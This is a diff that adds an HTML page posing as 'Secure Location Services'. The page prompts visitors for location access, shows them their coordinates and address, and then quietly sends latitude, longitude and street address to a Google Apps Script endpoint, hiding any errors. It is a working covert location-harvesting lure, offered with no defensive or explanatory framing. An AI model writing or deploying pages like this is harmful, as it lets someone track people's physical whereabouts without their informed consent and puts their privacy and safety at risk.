@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Connecting to Secure Location Services...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #121212;
+      color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      text-align: center;
+    }
+    .loader {
+      border: 6px solid #444;
+      border-top: 6px solid #09f;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    h2 { margin-bottom: 10px; font-weight: normal; }
+    p#output { margin-top: 20px; font-size: 0.95rem; color: #ccc; }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+  <h2>Connecting to Secure Location Services…</h2>
+  <p id="output">Please allow location access when prompted.</p>
+
+  <script>
+    window.onload = function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+      } else {
+        document.getElementById("output").innerText = "Geolocation is not supported by your browser.";
+      }
+    }
+
+    function showPosition(position) {
+      const lat = position.coords.latitude.toFixed(5);
+      const lon = position.coords.longitude.toFixed(5);
+
+      // Get the address
+      fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+        .then(res => res.json())
+        .then(data => {
+          const address = data.display_name || "Unknown location";
+          const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
+
+          document.querySelector('.loader').classList.add('hidden');
+          document.querySelector('h2').innerText = "Location Access Granted";
+          document.getElementById("output").innerHTML = `
+            ✅ Location retrieved.<br>
+            Latitude: ${lat}<br>
+            Longitude: ${lon}<br>
+            <a href="${mapLink}" target="_blank">View on Google Maps</a><br><br>
+            📌 Address: ${address}
+          `;
+
+          // Send to Google Sheets
+          fetch("https://script.google.com/macros/s/AKfycbz-4vqPJeFrMxLyBEeqvtEPJhlIbL5UAO9mnZP2UpgZb81utEBPnN0T_jLe7foT0kiy/exec", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              latitude: lat,
+              longitude: lon,
+              address: address
+            }),
+            mode: "no-cors" // ✅ CORS workaround for Apps Script
+          }).catch(err => {
+            console.warn("Failed to send to Google Sheets:", err);
+          });
+        }).catch(err => {
+          document.getElementById("output").innerText = "❌ Failed to retrieve address.";
+          console.error(err);
+        });
+    }
+
+    function showError(error) {
+      document.querySelector('.loader').classList.add('hidden');
+      document.querySelector('h2').innerText = "Failed to Retrieve Location";
+
+      let message = "";
+      switch(error.code) {
+        case error.PERMISSION_DENIED: message = "❌ Location access was denied."; break;
+        case error.POSITION_UNAVAILABLE: message = "⚠️ Location information is unavailable."; break;
+        case error.TIMEOUT: message = "⏰ The request timed out."; break;
+        default: message = "❓ An unknown error occurred."; break;
+      }
+      document.getElementById("output").innerText = message;
+    }
+  </script>
+</body>
+</html>
